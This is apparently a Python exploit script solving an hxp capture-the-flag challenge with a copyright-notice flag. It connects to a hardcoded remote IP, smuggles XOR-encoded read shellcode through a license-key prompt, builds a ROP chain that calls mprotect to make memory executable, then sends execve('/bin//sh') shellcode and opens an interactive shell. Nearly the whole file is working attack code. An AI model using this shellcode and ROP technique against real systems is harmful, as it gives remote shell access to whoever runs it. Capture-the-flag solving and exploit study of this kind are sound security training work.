from pwnlib import *

# hxp{The unauthorized reproduction or distribution of this copyrighted work
# is illegal. Criminal copyright infringement, including infringement without
# monetary gain, is investigated by the FBI and is punishable by up to five
# years in federal prison and a fine of $250,000.}

#s = Socket(("localhost", 5553))
s = Socket(("104.154.90.175", 54509))


shellcode = assemble("""

push rax
push rax
push rsp
push 0x100
pop rdx
pop rsi
pop rdi
pop rax
syscall
ret

""")

assert len(shellcode) <= 0x10
shellcode += "\x11"*(0x10 - len(shellcode))

base = 	"""0x3f	0x8e	0x07	0x49	0x8a	0x21	0x83	0xea
	0xf1	0xf5	0xbe	0xb5	0x27	0xa5 0x80	"""
base = base.replace("0x", "").replace(" ", "").replace("\t", "").strip()
base = base.replace("\n", "").decode("hex")

payload  = "A"*0x11
payload += xor(xor(shellcode, base), "\x01"*0x10)
assert "\n" not in payload

s.ru("License Key: ")
s.send(payload[:0x11+15])

s.ru("Starting protected code...\n")

payload = "B"*8
payload += pq(0xdeadbeef)

payload = "A"*0x10

"""
=> 0x400ae6 <protected+16>:	pop    rdx
   0x400ae7 <protected+17>:	pop    rsi
   0x400ae8 <protected+18>:	pop    rdi
   0x400ae9 <protected+19>:	pop    rax
   0x400aea <protected+20>:	syscall 
   0x400aec <protected+22>:	ret    

"""

payload += pq(0x400ae6)
payload += pq(7)
payload += pq(0x1000)
payload += pq(0x400000)
payload += pq(10) # mprotect


payload += pq(0x400ae6)
payload += pq(0x100)
payload += pq(0x400000)
payload += pq(0)
payload += pq(0) # read
payload += pq(0x400000)

s.send(payload)

time.sleep(1)


s.send(("31c05048b92f2f62696e2f736851545f5057545e99b03b0f05").decode("hex"))

s.interact()
